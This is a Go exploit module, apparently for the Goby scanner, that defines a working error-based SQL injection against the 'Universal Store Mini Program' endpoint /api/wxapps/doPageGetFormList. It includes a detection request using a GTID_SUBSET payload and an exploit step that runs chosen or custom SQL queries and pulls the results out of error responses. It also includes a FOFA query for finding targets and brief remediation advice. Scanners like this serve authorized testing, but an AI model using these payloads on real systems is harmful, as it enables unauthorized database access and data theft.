package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Universal Store Mini Program /api/wxapps/doPageGetFormList SQL Injection Vulnerability",
    "Description": "<p>The Universal Store Mini Program is an independent application developed based on the ThinkPHP5 framework, suitable for mini programs and enterprise store mini programs in various industries. This vulnerability exists in the doPageGetFormList interface, allowing attackers to construct malicious SQL statements to perform arbitrary database queries, potentially leading to sensitive information disclosure.</p>",
    "Product": "Universal Store Mini Program",
    "Homepage": "https://diy.aoliqi.cn/",
    "DisclosureDate": "2024-11-22",
    "PostTime": "2024-11-26",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"/comhome/cases/index.html\"",
    "GobyQuery": "body=\"/comhome/cases/index.html\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to execute arbitrary queries in the database through SQL injection, potentially leading to sensitive data leakage, data tampering, and system integrity compromise.</p>",
    "Recommendation": "<p>It is recommended to parameterize SQL queries to avoid directly concatenating user input. Also, upgrade to the latest version and use a WAF (Web Application Firewall) to detect and block SQL injection attacks.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8FdoPageGetFormList%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/wxapps/doPageGetFormList",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": "suid=' AND GTID_SUBSET(CONCAT(0x7e,(SELECT MD5({{{rand_int}}})),0x7e),4777)-- YJDd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/wxapps/doPageGetFormList",
                "keydemo|lastbody|variable|/api/wxapps/doPageGetFormList"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/wxapps/doPageGetFormList",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": "suid=' AND GTID_SUBSET(CONCAT(0x7e,({{{payload}}}),0x7e),4777)-- YJDd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "~([\\s\\S]*?)~",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~([\\s\\S]*?)~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}suid=' *"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "万能门店小程序 /api/wxapps/doPageGetFormList SQL 注入漏洞",
            "Product": "万能门店小程序",
            "Description": "<p>万能门店小程序是基于ThinkPHP5框架开发的独立应用，适用于各行各业的小程序和企业门店小程序。该漏洞存在于doPageGetFormList接口中，攻击者可以通过构造恶意的SQL语句，进行数据库的任意查询，可能导致敏感信息泄露。</p>",
            "Recommendation": "<p>建议对SQL查询进行参数化处理，避免直接拼接用户输入。同时，升级到最新版本并使用WAF（Web应用防火墙）来检测和阻止SQL注入攻击。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入在数据库中执行任意查询，可能导致敏感数据泄露、数据篡改和系统完整性破坏。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Universal Store Mini Program /api/wxapps/doPageGetFormList SQL Injection Vulnerability",
            "Product": "Universal Store Mini Program",
            "Description": "<p>The Universal Store Mini Program is an independent application developed based on the ThinkPHP5 framework, suitable for mini programs and enterprise store mini programs in various industries. This vulnerability exists in the doPageGetFormList interface, allowing attackers to construct malicious SQL statements to perform arbitrary database queries, potentially leading to sensitive information disclosure.</p>",
            "Recommendation": "<p>It is recommended to parameterize SQL queries to avoid directly concatenating user input. Also, upgrade to the latest version and use a WAF (Web Application Firewall) to detect and block SQL injection attacks.</p>",
            "Impact": "<p>This vulnerability allows attackers to execute arbitrary queries in the database through SQL injection, potentially leading to sensitive data leakage, data tampering, and system integrity compromise.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "rand_int": "define|variable|{{{rand|int|6}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}"
    },
    "EditType": "fast",
    "PocId": "9974"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}